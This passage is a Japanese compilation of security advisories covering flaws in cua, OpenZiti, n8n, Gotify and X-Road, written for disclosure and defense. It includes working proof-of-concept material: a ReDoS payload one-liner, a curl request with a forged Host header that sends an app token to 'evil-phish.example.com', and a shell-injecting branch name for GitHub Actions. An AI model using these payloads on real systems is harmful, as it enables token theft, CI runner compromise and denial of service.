* **影響を受けるバージョン & コンポーネント:** `<= 0.8.0`（`commit e754cfec69c41400eb2aabde716c27d15607b2f0`）— `libs/cua/crates/cua-media-codec/src/videotoolbox/mod.rs`（`VtEncoder::encode` -> `pixel_buffer_for`、`308-420` 行）
* **脆弱性分類 & スコア:** `CWE-125`（境界外読み取り / Out-of-Bounds Read）/ `CWE-190`（整数オーバーフローまたはラップアラウンド）— **CVSS v3.1: `5.5 Medium`**（`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H`）
* **GitHub GHSA リンク:** `GHSA-54v9-fxw3-36mm`（`https://github.com/trycua/cua/security/advisories/GHSA-54v9-fxw3-36mm`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md`](advisories/ja/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
Rust では `unsafe` キーワードを付けない公開関数（`pub fn encode(&mut self, frame: &VideoFrame)`）は、どのような入力が渡されても未定義動作（メモリ破壊や境界外アクセス）を起こさないことが言語の安全性契約（Soundness Contract）として求められます。

ところが macOS VideoToolbox ハードウェアエンコーダ実装の `pixel_buffer_for`（`308-420` 行）は、渡された画像フレーム `frame.data` の実際のスライス長（`y.len()`、`uv.len()`、`data.len()`）を確認しないまま、生ポインタ演算と `unsafe { std::ptr::copy_nonoverlapping }` を実行しています。
```rust
// libs/cua/crates/cua-media-codec/src/videotoolbox/mod.rs:344-367
unsafe {
    let y_dst = CVPixelBufferGetBaseAddressOfPlane(pb, 0) as *mut u8;
    let y_dst_stride = CVPixelBufferGetBytesPerRowOfPlane(pb, 0);
    for row in 0..h {
        // バグ: y.len() が row * (*y_stride as usize) + w 以上であるか全くチェックしていない！
        std::ptr::copy_nonoverlapping(
            y.as_ptr().add(row * (*y_stride as usize)),
            y_dst.add(row * y_dst_stride),
            w,
        );
    }
```
もし解像度切り替えのタイミングや異常なフレーム入力によって、本来の `w * h` より短い `y` / `uv` バッファが渡されると、`copy_nonoverlapping` はバッファの終端を飛び越えて **隣接するヒープメモリ領域（セッショントークン、API キー、他テナントのメモリなど）を読み取り、そのまま H.264 映像ピクセルとしてエンコードしてリモート視聴者へ送信** してしまいます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — macOS リモートデスクトップ配信のウィンドウ・解像度変更時におけるヒープメモリ（`960` バイト）の映像ストリーム漏洩:**
  1. リモートエージェントセッション中にキャプチャ解像度が変更され、古いサイズのまま切り詰められた `FrameData::Nv12` バッファが `VtEncoder::encode` に渡される。
  2. `pixel_buffer_for` がスライス境界を超えて隣接ヒープ領域の `960` バイトを `CVPixelBuffer` にコピーし、クライアントが受信する映像フレーム内にプロセス内の機密ヒープデータが混入する。
* **シナリオ B — 不正またはゼロ長の `VideoFrame` 入力による `cua-spacesd` メディアデーモンの即時クラッシュ（`SIGSEGV`）:**
  1. IPC またはネットワーク経由で空の `y: &[]` を持つ `VideoFrame`（例: `w=1920, h=1080`）が送られる。
  2. Safe Rust 関数であるにもかかわらず未マップのメモリページを読みに行き、`cua-spacesd` プロセス全体がセグメンテーション違反（`SIGSEGV`）で異常終了し、稼働中の全エージェントセッションが切断される。
* **シナリオ C — マルチセッション macOS ホストにおける不整合な `stride` 値での他セッションデータ混入:**
  1. `y_stride` または `Bgra` の `stride` が `w` より小さい、あるいは極端に大きい値で渡された際、行ごとのポインタ加算がアロケーション境界を大きく飛び越え、同一プロセス内の別セッションのメモリを読み取る。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. videotoolbox/mod.rs 内の copy_nonoverlapping 実装箇所の確認
sed -n '335,415p' /path/to/cua/libs/cua/crates/cua-media-codec/src/videotoolbox/mod.rs

# 2. Sniper E2E 検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_vt01 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "oob_bytes_read": 960,
    "adjacent_heap_secret_copied_to_video_frame": true
  },
  "GREEN": {
    "oob_bytes_read": 0,
    "adjacent_heap_secret_copied_to_video_frame": false,
    "error": "CodecError::InvalidArgument"
  },
  "BENIGN": {
    "valid_frame_encoded_bytes": 1536
  }
}
```

---

### III.07 — TryCua `cua-bench` WinArena (`<= 0.3.1`) — 未認証 `0.0.0.0:8006`（noVNC）およびパスワードなし `0.0.0.0:3390`（RDP）の LAN 公開 + 書き込み可能なホスト `/shared` マウント（`GHSA-hvhg-6x47-cq96`、`CWE-668`/`CWE-732`、CVSS `8.6 High`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `trycua/cua`（`pip: cua-bench <= 0.3.1`）
* **影響を受けるバージョン & コンポーネント:** `<= 0.3.1`（`commit e754cfec69c41400eb2aabde716c27d15607b2f0`）— `libs/cua-bench/tasks/winarena_adapter/cli.py`（`cmd_vm_setup`, `cmd_vm_start`, `cmd_task_run`、`262-265, 421-424, 646-649` 行）および `infra/vm/setup/server/main.py`（`180-248, 290-321` 行）
* **脆弱性分類 & スコア:** `CWE-668`（誤った領域へのリソース露出）/ `CWE-732`（重要リソースに対する不適切な権限割り当て）— **CVSS v3.1: `8.6 High`**（`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`）
* **GitHub GHSA リンク:** `GHSA-hvhg-6x47-cq96`（`https://github.com/trycua/cua/security/advisories/GHSA-hvhg-6x47-cq96`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md`](advisories/ja/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
Docker でコンテナを起動する際、`127.0.0.1:` プレフィックスを付けずに `-p 8006:8006` と指定すると、Docker は **`0.0.0.0`（ホストのすべての Wi-Fi / Ethernet ネットワークインターフェース）** にポートを公開し、さらに Linux の `iptables` `DOCKER` チェーンによって通常のホストファイアウォール（`ufw` 等）の入力制限をバイパスしてしまいます。

WinArena オーケストレータ（`cli.py:262-265, 421-424, 646-649`）では、3つの起動コマンドすべてが以下のオプションを渡しています。
```python
# libs/cua-bench/tasks/winarena_adapter/cli.py:261-266 (および 421-424, 646-649)
"-p", f"{args.browser_port}:8006", # バグ 1: 0.0.0.0:8006 -> 認証なし noVNC Web デスクトップを LAN 全体に公開！
"-p", f"{args.rdp_port}:3389",     # バグ 2: 0.0.0.0:3390 -> パスワードなし Windows RDP を LAN 全体に公開！
"-v", f"{storage_path}:/storage",
"-v", f"{setup_path}:/shared",     # バグ 3: ホスト側のパッケージソースディレクトリを読み書き可能(:rw)でマウント！
```
この結果、同じネットワーク上の誰でもパスワードなしで Windows VM の画面を開いて操作でき、さらに VM の中から `/shared` フォルダ（ホストの Python パッケージ内の `setup` ディレクトリ）にあるスクリプトを書き換えることで、ホスト OS 側へ侵入を拡大できてしまいます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — 大学研究室・社内 LAN 上での `0.0.0.0:8006`（noVNC）/ `3390`（RDP）経由の Windows VM と API キー乗っ取り:**
  1. AI 研究者が研究室やオフィスの LAN に接続されたマシンで `cua-bench` の WinArena 評価を実行する。
  2. 同一ネットワーク上の第三者がブラウザで `http://<ワークステーションIP>:8006` を開くだけで、認証なしで Windows VM のデスクトップ画面に直接接続し、ベンチマーク用に環境へ注入された OpenAI / Anthropic API キーや評価データを窃取する。
* **シナリオ B — 書き込み可能な `-v {setup_path}:/shared` マウントを悪用した VM からホスト OS への逆侵害（コンテナ/VM エスケープ経路）:**
  1. 攻撃者が `8006`（noVNC）または `3390`（RDP）から Windows VM に入り、共有マウント `/shared`（ホスト上の `winarena_adapter/infra/vm/setup`）内のスクリプトやバイナリを改ざんする。
  2. ホスト側の Python CLI や別プロセスがそのセットアップディレクトリを参照・再実行した際に、ホスト OS 上で攻撃者のコードが実行される。
* **シナリオ C — VM 内の未認証 `0.0.0.0:5000` エージェントサーバー（`POST /execute_windows` -> `exec()`）による任意コマンド実行:**
  1. VM 内部で動く `infra/vm/setup/server/main.py`（`180-248` 行）は認証なしで `POST /execute_windows`（Python `exec()`）および `POST /setup/launch`（`subprocess.Popen(..., shell=True)`）を公開している。
  2. エージェントがタスク実行中に外部 Web ページを開いた際、またはコンテナネットワーク経由でリクエストが送られた際、VM 内で任意の OS コマンドが実行される。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. cli.py 内の Docker ポートバインドとボリュームマウントのソース確認
sed -n '255,272p' /path/to/cua/libs/cua-bench/tasks/winarena_adapter/cli.py

# 2. Sniper E2E 検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand06 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "lan_exposed_ports": ["8006:8006", "3390:3389"],
    "host_setup_dir_mounted_writable": true,
    "host_setup_file_tampered_from_container": true
  },
  "GREEN": {
    "lan_exposed_ports": [],
    "loopback_bound_ports": ["127.0.0.1:8006:8006", "127.0.0.1:3390:3389"],
    "host_setup_dir_mounted_writable": false,
    "readonly_mount": true
  }
}
```

---

### III.08 — OpenZiti (`ziti` CLI) — `AreCertsTrusted` -> `InsecureClient` における無条件 `InsecureSkipVerify: true` による TLS 証明書検証バイパス（`GHSA-qwv8-hh9r-cqrf`、`CWE-295`、CVSS `7.4 High`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `openziti/ziti`（`Go: github.com/openziti/ziti/v2`）
* **影響を受けるバージョン & コンポーネント:** `v2.0.0-pre6` 以下（`commit 08f09c510bb2673d3632419ba8d6e10002d5eb00`）— `ziti/util/certs.go`（`AreCertsTrusted` `91-103` 行、`InsecureClient` `199-208` 行）および `ziti/cmd/edge/login.go`（`319-390` 行）
* **脆弱性分類 & スコア:** `CWE-295`（不適切な証明書検証）— **CVSS v3.1: `7.4 High`**（`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`）
* **GitHub GHSA リンク:** `GHSA-qwv8-hh9r-cqrf`（`https://github.com/openziti/ziti/security/advisories/GHSA-qwv8-hh9r-cqrf`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md`](advisories/ja/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
Zero-Trust ネットワーク基盤である OpenZiti の CLI で管理者が `ziti edge login` を実行すると、まず接続先コントローラの TLS 証明書が信頼できるかどうかを確認するために `AreCertsTrusted(host)`（`certs.go:91-103`）が呼ばれます。

この関数は、「もし偽の証明書であれば Go の TLS ライブラリが `x509.UnknownAuthorityError` を返すはずだから、それをキャッチしてユーザーに警告しよう」という意図で書かれています。ところが、内部で呼び出している `InsecureClient(&client, certs)`（`199-208` 行）に致命的なバグがありました。
```go
// ziti/util/certs.go:91-103, 199-208
func AreCertsTrusted(host string, certs []*x509.Certificate) (bool, error) {
    client := resty.New()
    InsecureClient(client, certs) // <--- ここで TLS 設定を行う
    _, err := client.R().Get(host)
    if err != nil {
        if errors.Is(err, &x509.UnknownAuthorityError{}) { // デッドコード！絶対に到達しない！
            return false, nil
        }
        return false, err
    }
    return true, nil
}

func InsecureClient(client *resty.Client, certs []*x509.Certificate) {
    tlsCfg := &tls.Config{
        InsecureSkipVerify: true, // バグ: 無条件で true が設定されている！
    }
    if len(certs) > 0 {
        tlsCfg.RootCAs = x509.NewCertPool()
        for _, c := range certs {
            tlsCfg.RootCAs.AddCert(c)
        }
        // ここでも InsecureSkipVerify は true のまま！
    }
    client.SetTLSClientConfig(tlsCfg)
}
```
Go の標準ライブラリ `crypto/tls` では、**`InsecureSkipVerify: true` が設定されていると、`RootCAs` に何が入っていようとサーバー証明書の署名チェーン・有効期限・ホスト名の検証をすべてスキップ** します。その結果、`AreCertsTrusted()` は攻撃者が勝手に作った自己署名証明書に対しても常に `true, nil` を返し、CLI は **`"Verified that server supplied certificates are trusted"`（サーバー証明書が信頼できることを確認しました）** という誤ったメッセージを表示した上で、管理者の ID・パスワードを攻撃者へ送信してしまいます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — リモートワークや出張中のインフラ管理者が `ziti edge login` を実行した際の MITM による管理者パスワード窃取:**
  1. インフラ管理者がカフェやホテルの Wi-Fi、あるいは侵害されたネットワーク経路から `ziti edge login https://ziti-controller.corp.example:1280 -u admin -p <password>` を実行する。
  2. 経路上の攻撃者が完全に無関係な自己署名証明書を提示して TLS 接続をインターセプトする。
  3. `AreCertsTrusted()` が `true` を返すため、確認プロンプトすら出ずに信頼済みと判定され、`POST /edge/management/v1/authenticate?method=password` で管理者クレデンシャルが攻撃者へ直接送信される。
* **シナリオ B — CI/CD パイプラインや Kubernetes 自動ブートストラップにおける偽コントローラへのゼロトラスト登録:**
  1. 自動デプロイジョブが `--yes` なしで安全に証明書検証を行うつもりで `ziti edge login` を実行する。
  2. DNS スプーフィングや BGP ハイジャックにより接続先が攻撃者のサーバーへ向いた際、エラーで停止せずにそのまま認証トークンやサービスポリシーを攻撃者へ送信する。
* **シナリオ C — 期限切れ・失効済み・誤った CA のコントローラ証明書のサイレント受け入れ:**
  1. 本番環境で誤ってテスト用 CA の証明書や期限切れ証明書がデプロイされた場合でも、`ziti edge login` が「信頼済み」と報告し続けるため、PKI ガバナンス違反が検知されない。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. ziti/util/certs.go 内の AreCertsTrusted と InsecureClient のソースコード確認
sed -n '90,105p;198,210p' /path/to/ziti/ziti/util/certs.go

# 2. Sniper E2E 検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_ziti_cand01 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "rogue_mitm_cert_accepted_as_trusted": true,
    "admin_credentials_sent_to_mitm": true
  },
  "GREEN": {
    "rogue_mitm_cert_accepted_as_trusted": false,
    "admin_credentials_sent_to_mitm": false,
    "error": "x509.UnknownAuthorityError"
  },
  "BENIGN": {
    "valid_ca_cert_trusted": true
  }
}
```

---

### III.09 — n8n (`n8n-workflow <= 2.45.0`) — `string-extensions.ts` における入力長無制限の `EMAIL_REGEXP` / `DOMAIN_EXTRACT_REGEXP`（`isEmail` / `extractEmail` / `extractDomain`）による Webhook イベントループ凍結（`ReDoS`、`CWE-1333`、CVSS `5.3 Medium`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `n8n-io/n8n`（`npm: n8n-workflow <= 2.45.0`）
* **影響を受けるバージョン & コンポーネント:** `<= 2.45.0`（`commit 976c80c63ba38fffe1ffde1fb6fb6fb4edbe8b51`）— `packages/workflow/src/extensions/string-extensions.ts`（`59, 94, 326, 375, 383` 行）
* **脆弱性分類 & スコア:** `CWE-1333`（非効率な正規表現の複雑性 / ReDoS）— **CVSS v3.1: `5.3 Medium`**（`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/09-N8N-CAND-01-WEBHOOK-REDOS.md`](advisories/ja/09-N8N-CAND-01-WEBHOOK-REDOS.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
ワークフロー自動化基盤 `n8n` では、Webhook 等で受け取った文字列に対して `{{ $json.body.email.isEmail() }}` や `{{ $json.body.text.extractEmail() }}`、`{{ $json.body.url.extractDomain() }}` といった組み込みメソッドが日常的に使われます。

ところが `string-extensions.ts` に定義されている正規表現には、**入力文字列の長さ制限（RFC 5321 の 254 文字制限など）が一切なく、さらに先頭アンカー（`^`）のない部分一致パターンに入れ子量指定子（`(\.[^...]+)*`）が含まれている** という問題があります。
```typescript
// packages/workflow/src/extensions/string-extensions.ts:59, 94
const EMAIL_REGEXP =
  /(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))/;

const DOMAIN_EXTRACT_REGEXP = /^(?:https?:\/\/)?(?:www\.)?((?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})(?:\/|$)/;
```
Node.js はシングルスレッドのイベントループで全ての HTTP Webhook リクエストと UI 操作を処理します。そこへ `"a.a.a.a..."`（約 10〜20 KB のドット区切り文字列の末尾に `@!` を付けたもの）を1つ送ると、V8 正規表現エンジンが全開始位置でバックトラッキングを繰り返し、**1リクエストあたり数百ミリ秒〜1秒近くイベントループを完全に停止** させます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — 公開リード獲得・問い合わせ Webhook への軽量リクエスト送信による全社 Stripe/Slack Webhook の凍結:**
  1. 企業が Web サイトの問い合わせフォームやユーザー登録の受け口として n8n Webhook を公開し、`IF` ノードで `{{ $json.body.email.isEmail() }}` を評価している。
  2. 攻撃者が 20 KB の `"a.a.a...a@!"` ペイロードを毎秒数回 POST する。
  3. 1リクエストで約 `832 ms` イベントループがブロックされるため、同じ n8n インスタンス上で動いている無関係な決済 Webhook（Stripe）や社内通知（Slack）、管理画面 UI まで全てタイムアウトする。
* **シナリオ B — カスタマーサポート自動取り込みフロー（`extractEmail()`）におけるコンテナ再起動ループ:**
  1. 受信メールやチャットメッセージを `{{ $json.text.extractEmail() }}` で解析するワークフローが稼働している。
  2. 長いドット区切り文字列を含む1通のスパム/悪意あるメッセージが処理されるとワーカーがフリーズし、Kubernetes の Liveness Probe が失敗してコンテナが再起動ループに陥る。
* **シナリオ C — CRM URL ドメイン抽出（`extractDomain()`）における V8 イベントループ枯渇:**
  1. 外部フォームやスクレイピング結果の URL から `{{ $json.url.extractDomain() }}` でドメインを抽出するワークフローに、末尾がスラッシュでない長いドット付きホスト名文字列が入力され、CPU コアが 100% 張り付く。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. Node.js ワンライナーによる string-extensions.ts の EMAIL_REGEXP 停止時間の計測
node -e 'const re = /(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))/; const s = "a.".repeat(10000) + "a@!"; const t0 = performance.now(); re.test(s); console.log("Elapsed ms:", (performance.now() - t0).toFixed(2));'

# 2. Sniper E2E 検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_n8n_cand01 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "regex_stall_ms": 165.035,
    "stall_20kb_ms": 831.78,
    "concurrent_webhook_starved": true
  },
  "GREEN": {
    "regex_stall_ms": 0.017,
    "stall_20kb_ms": 0.0029,
    "concurrent_webhook_starved": false
  },
  "BENIGN": {
    "valid_email_recognized": true
  }
}
```

---

### III.10 — Gotify Server (`<= v2.9.1`) — 組み込み `SSL.RedirectToHTTPS` ミドルウェア（`router.go`）における未検証 `ctx.Request.Host` ヘッダーによる `308 Permanent Redirect` オープンリダイレクトとトークン漏洩（`GHSA-cc9f-m5vr-pm75`、`CWE-601`、CVSS `4.7 Medium`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `gotify/server`（`Go: github.com/gotify/server/v2`）
* **影響を受けるバージョン & コンポーネント:** `<= v2.9.1`（`commit 97685e2a6f9c02b92263ef0df9831371a79d150b`）— `router/router.go`（`52-73, 93-102` 行）
* **脆弱性分類 & スコア:** `CWE-601`（信頼できないサイトへの URL リダイレクト / オープンリダイレクト）— **CVSS v3.1: `4.7 Medium`**（`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N`）
* **GitHub GHSA リンク:** `GHSA-cc9f-m5vr-pm75`（`https://github.com/gotify/server/security/advisories/GHSA-cc9f-m5vr-pm75`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md`](advisories/ja/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
Gotify Server で組み込み TLS（`SSL.Enabled: true`）と HTTPS 自動リダイレクト（`SSL.RedirectToHTTPS: true`）を有効にすると、`router/router.go` が HTTP リクエストを HTTPS へ転送するミドルウェアを登録します。

しかし、このミドルウェアはサーバーの設定ファイルに書かれた正規ドメイン（`conf.SSL.LetsEncrypt.Hosts`）を参照せず、**クライアントが送ってきた HTTP リクエストの `Host` ヘッダー（`ctx.Request.Host`）をそのまま信頼して `Location: https://<Host>/<Path>` を組み立て、HTTP `308 Permanent Redirect` を返してしまいます**。
```go
// router/router.go:93-102
httpRouter.Use(func(ctx *gin.Context) {
    if ctx.Request.TLS == nil {
        // バグ: 攻撃者が自由に書き換え可能な ctx.Request.Host をそのままリダイレクト先に使っている！
        location := url.URL{
            Scheme:   "https",
            Host:     ctx.Request.Host,
            Path:     ctx.Request.URL.Path,
            RawQuery: ctx.Request.URL.RawQuery,
        }
        ctx.Redirect(http.StatusPermanentRedirect, location.String()) // 308 Permanent Redirect
        ctx.Abort()
    }
})
```
さらにステータスコードが `308 Permanent Redirect` であるため、HTTP メソッド（`POST` 等）とクエリ文字列（`?token=<app-token>`）およびリクエストボディを変更せずにそのまま攻撃者のサーバーへ再送信するようクライアントに指示してしまいます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — 自動監視・通知スクリプト（`curl -L` / Python `requests` / Uptime Kuma）からの `?token=` アプリケーショントークン窃取:**
  1. サーバー監視ツールや CI/CD 通知スクリプトが `http://gotify.internal/message?token=AgSecretToken123` に対してリダイレクト追従有効で POST リクエストを送っている。
  2. ネットワーク境界またはプロキシ経由で `Host: attacker-collector.example` が注入されると、Gotify は `308 Permanent Redirect` で `Location: https://attacker-collector.example/message?token=AgSecretToken123` を返す。
  3. クライアントが自動的にリダイレクト先へ POST を再送し、秘密のアプリケーショントークンと通知本文が攻撃者サーバーへそのまま渡される。
* **シナリオ B — 共有 HTTP キャッシュ / CDN / キャプティブポータルにおける `308` キャッシュポイズニングとフィッシング誘導:**
  1. 共有キャッシュやリバースプロキシの背後に置かれた Gotify に対し、攻撃者が `Host: fake-gotify-login.example` ヘッダー付きリクエストを送る。
  2. キャッシュされた `308 Permanent Redirect` により、後続の正規ユーザーのブラウザが永続的に偽のログイン画面へ転送される。
* **シナリオ C — ブラウザ永続リダイレクトキャッシュを利用した WebSocket / Web UI セッションの誘導:**
  1. ユーザーが一度でも悪意ある `Host` ヘッダーを伴うレスポンスを受け取ると、`308` がブラウザにキャッシュされ、次回以降のアクセスも攻撃者ホストへ向かう。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. ローカル隔離テスト環境での Host ヘッダーインジェクション再現コマンド例
curl -i "http://127.0.0.1:18080/message?token=secret-app-token" \
  -H "Host: evil-phish.example.com"

# 2. Sniper E2E 検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_gotify_cand01 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "status_code": 308,
    "location": "https://evil-phish.example.com/message?token=secret-app-token",
    "redirected_to_untrusted_host": true
  },
  "GREEN": {
    "status_code": 308,
    "location": "https://push.corp.example/message?token=secret-app-token",
    "redirected_to_untrusted_host": false,
    "bound_to_configured_ssl_host": true
  }
}
```

---

### III.11 — Nordic Institute X-Road (`develop`) — 永続セルフホストランナー `xrd-runner-8c` 上で動作する `_build-and-package.yml` 内の `${{ github.head_ref }}` シェルコマンドインジェクション（`GHSA-4fcw-7xqx-fjv5`、`CWE-78`、CVSS `8.5 High`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `nordic-institute/X-Road`（GitHub Actions CI/CD パイプライン — `commit 38cd99ec0ebba0bd68a2581ca3c92be2e5f5843f`）
* **影響を受けるバージョン & コンポーネント:** `develop` ブランチ — `.github/workflows/build.yaml`（`1-55` 行）および `.github/workflows/_build-and-package.yml`（`Determine target branch` ステップ、`84-91` 行）
* **脆弱性分類 & スコア:** `CWE-78`（OS コマンドインジェクション）— **CVSS v3.1: `8.5 High`**（`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`）
* **GitHub GHSA リンク:** `GHSA-4fcw-7xqx-fjv5`（`https://github.com/nordic-institute/X-Road/security/advisories/GHSA-4fcw-7xqx-fjv5`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/11-XROAD-CAND-01-RUNNER-INJECTION.md`](advisories/ja/11-XROAD-CAND-01-RUNNER-INJECTION.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
GitHub Actions の YAML ファイル内で `${{ github.head_ref }}`（プルリクエストのブランチ名）を書くと、GitHub は **bash を起動する前の文字列置換としてその値をそのままスクリプト内に埋め込みます**。

X-Road のメインビルドワークフロー `build.yaml` は、`pull_request` イベントで発火し、**書き込み権限（`contents: write`, `packages: write`）と全シークレット継承（`secrets: inherit`）** を付けた状態で再利用ワークフロー `_build-and-package.yml` を呼び出します。そして `_build-and-package.yml` は **永続的なセルフホストランナー（`runs-on: xrd-runner-8c`）** 上で、最初のステップ（`actions/checkout` より前）として以下のスクリプトを実行します。
```yaml
# .github/workflows/_build-and-package.yml:84-91
jobs:
  build-packages:
    runs-on: xrd-runner-8c
    steps:
      - name: Determine target branch
        run: |
          if [ "${{ github.event_name }}" == "pull_request" ]; then
            echo "TARGET_BRANCH=${{ github.head_ref }}" >> "$GITHUB_ENV"
          else
            echo "TARGET_BRANCH=${{ github.ref_name }}" >> "$GITHUB_ENV"
          fi
```
Git のブランチ名には二重引用符（`"`）やセミコロン（`;`）を含めることができます。そのため、ブランチ名を `feat";id;env;#` にして PR を作成すると、展開後の bash スクリプトは `echo "TARGET_BRANCH=feat";id;env;#" >> "$GITHUB_ENV"` となり、**コードレビューが始まる前にセルフホストランナー上で任意の OS コマンドが実行** されます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — 細工されたブランチ名による PR 作成時のセルフホストランナー `xrd-runner-8c` 上での即時コマンド実行:**
  1. ブランチ作成権限を持つアカウントまたは侵害された開発者トークンから、`feat";<任意コマンド>;#` というブランチ名で PR が作成される。
  2. コードのチェックアウトやレビュアーの承認を待たずに、`Determine target branch` ステップで bash コマンドが即座に実行される。
* **シナリオ B — `secrets: inherit` と `packages: write` 権限を悪用した公式コンテナレジストリ（GHCR）・リポジトリ改ざん:**
  1. 親ワークフロー `build.yaml` が `permissions: contents: write, packages: write` と `secrets: inherit` を渡しているため、注入されたコマンドは書き込み権限を持つ `GITHUB_TOKEN` と継承された CI シークレットにアクセスできる。
  2. 攻撃者はこれらを用いて公式パッケージレジストリへ改ざんイメージをプッシュしたり、リポジトリのブランチやタグを書き換えたりできる。
* **シナリオ C — 永続セルフホストランナー（`xrd-runner-8c`）のキャッシュ汚染による後続の公式 X-Road パッケージへのバックドア混入:**
  1. GitHub ホストランナーと異なり、`xrd-runner-8c` はビルド間で環境が破棄されない永続セルフホストサーバーである。
  2. 攻撃者がランナー上のローカル Gradle キャッシュ、Docker レイヤーキャッシュ、またはバックグラウンドプロセスを汚染することで、後続の正規リリースビルドで生成される `.deb` / `.rpm` パッケージにバックドアを混入させる。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. _build-and-package.yml と build.yaml の該当行をソースコードで確認
sed -n '1,55p' /path/to/X-Road/.github/workflows/build.yaml
sed -n '80,95p' /path/to/X-Road/.github/workflows/_build-and-package.yml

# 2. Sniper E2E 検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_xroad_cand01 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "runs_on": "xrd-runner-8c",
    "secrets_inherit": true,
    "direct_yaml_interpolation": true,
    "arbitrary_command_executed_on_self_hosted_runner": true
  },
  "GREEN": {
    "env_var_parameterized": true,
    "arbitrary_command_executed_on_self_hosted_runner": false
  },
  "BENIGN": {
    "target_branch_written": "feature/normal-branch"
  }
}
```

<!-- GITLAB-ADVISORIES-START -->

---

